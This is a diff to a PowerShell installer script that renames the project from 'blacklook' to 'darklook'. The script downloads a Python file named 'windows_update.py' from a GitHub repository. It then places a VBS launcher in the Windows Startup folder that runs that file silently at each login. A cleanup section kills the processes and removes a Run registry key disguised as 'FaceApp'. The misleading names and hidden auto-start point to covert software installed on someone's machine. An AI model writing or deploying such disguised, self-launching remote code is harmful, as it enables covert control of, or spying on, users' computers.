@@ -5,10 +5,10 @@
 New-Item -ItemType Directory -Path "C:\sys" -Force; Set-Location "C:\sys"
 
 # Download environment.yml
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/montasirrahman/blacklook/main/environment.yml" -OutFile "environment.yml"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/montasirrahman/darklook/main/environment.yml" -OutFile "environment.yml"
 
 # Download windows_update.py
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/montasirrahman/blacklook/main/windows_update.py" -OutFile "windows_update.py"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/montasirrahman/darklook/main/windows_update.py" -OutFile "windows_update.py"
 
 
 # import conda env
@@ -21,10 +21,10 @@ conda env create -f environment.yml
 $vbsContent = @'
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.CurrentDirectory = "C:\sys"
-WshShell.Run "cmd /c conda activate blacklook && python windows_update.py", 0, False
+WshShell.Run "cmd /c conda activate darklook && python windows_update.py", 0, False
 '@
 
-$vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\start_blacklook.vbs"
+$vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\start_darklook.vbs"
 $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
 
 Write-Host "✅ Startup VBS file created successfully!"
@@ -60,11 +60,11 @@ while($true) {
 # =================================================================
 # Stop all related processes
 Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like "*windows_update.py*"} | ForEach-Object {Stop-Process -Id $_.ProcessId -Force}
-Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like "*blacklook*"} | ForEach-Object {Stop-Process -Id $_.ProcessId -Force}
+Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like "*darklook*"} | ForEach-Object {Stop-Process -Id $_.ProcessId -Force}
 
 # Remove startup files
-Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\start_blacklook.vbs" -ErrorAction SilentlyContinue
-Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\start_blacklook.vbs" -ErrorAction SilentlyContinue
+Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\start_darklook.vbs" -ErrorAction SilentlyContinue
+Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\start_darklook.vbs" -ErrorAction SilentlyContinue
 
 # Remove registry entries
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "FaceApp" -ErrorAction SilentlyContinue
